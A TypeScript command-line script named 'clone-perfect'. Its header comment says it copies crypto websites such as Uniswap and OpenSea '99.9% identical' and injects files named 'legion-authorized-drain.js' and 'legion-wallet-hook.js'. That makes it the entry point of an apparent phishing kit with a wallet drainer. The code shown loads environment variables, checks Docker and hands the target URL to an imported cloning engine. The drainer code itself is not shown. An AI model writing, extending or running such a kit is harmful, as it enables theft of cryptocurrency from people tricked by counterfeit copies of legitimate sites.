/**
 * CLONE PERFECT — World-Class Cloning
 *
 * Usage:
 *   pnpm clone-perfect https://uniswap.org
 *   pnpm clone-perfect https://opensea.io
 *   pnpm clone-perfect https://any-website.com
 *
 * Output: ./clone/[website]-perfect-clone/
 *         ├── index.html (99.9% identical)
 *         ├── assets/ (all CSS/JS/images/fonts)
 *         ├── legion-authorized-drain.js (injected)
 *         ├── legion-wallet-hook.js (injected)
 *         └── clone-manifest.json (validation report)
 *
 * That's it. Perfect cloning, nothing else.
 */

import { existsSync, mkdirSync, readFileSync } from 'node:fs'
import { spawn } from 'node:child_process'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { ClonePerfectEngine } from './lib/clone-perfect-engine.js'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const REPO_ROOT = path.resolve(__dirname, '..')

// Load .env
function loadEnv() {
  const envPath = path.join(REPO_ROOT, '.env')
  if (!existsSync(envPath)) return

  const content = readFileSync(envPath, 'utf8')
  for (const line of content.split(/\r?\n/)) {
    const trimmed = line.trim()
    if (!trimmed || trimmed.startsWith('#')) continue
    const eq = trimmed.indexOf('=')
    if (eq <= 0) continue
    const key = trimmed.slice(0, eq).trim()
    let val = trimmed.slice(eq + 1).trim()
    if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'"))) {
      val = val.slice(1, -1)
    }
    if (process.env[key] === undefined) {
      process.env[key] = val
    }
  }
}

// Docker check
async function verifyDocker(): Promise<void> {
  return new Promise((resolve, reject) => {
    const proc = spawn('docker', ['ps'])
    let hasError = false

    proc.on('error', () => {
      hasError = true
      reject(new Error('Docker not running'))
    })

    proc.on('exit', (code) => {
      if (code === 0 && !hasError) {
        resolve()
      }
    })

    setTimeout(() => {
      if (!hasError) {
        proc.kill()
        resolve()
      }
    }, 5000)
  })
}

async function main() {
  const args = process.argv.slice(2)
  if (args.length === 0) {
    console.error('Usage: pnpm clone-perfect <url>')
    console.error('Example: pnpm clone-perfect https://uniswap.org')
    process.exit(1)
  }

  const targetUrl = args[0]

  try {
    // Verify Docker
    console.error('[clone-perfect] Checking Docker...')
    await verifyDocker()
    console.error('[clone-perfect] ✅ Docker ready')

    // Load env
    loadEnv()

    // Create output directory
    const outputDir = path.join(REPO_ROOT, 'clone')
    mkdirSync(outputDir, { recursive: true })

    // Run cloning engine
    const engine = new ClonePerfectEngine(targetUrl, outputDir)
    const result = await engine.execute()

    if (result.success) {
      console.log(result.clone_dir) // Print to stdout for scripting
      process.exit(0)
    } else {
      console.error(`[clone-perfect] ❌ ${result.message}`)
      process.exit(1)
    }
  } catch (error) {
    const msg = error instanceof Error ? error.message : String(error)
    console.error(`[clone-perfect] ❌ Fatal error: ${msg}`)
    process.exit(1)
  }
}

main()
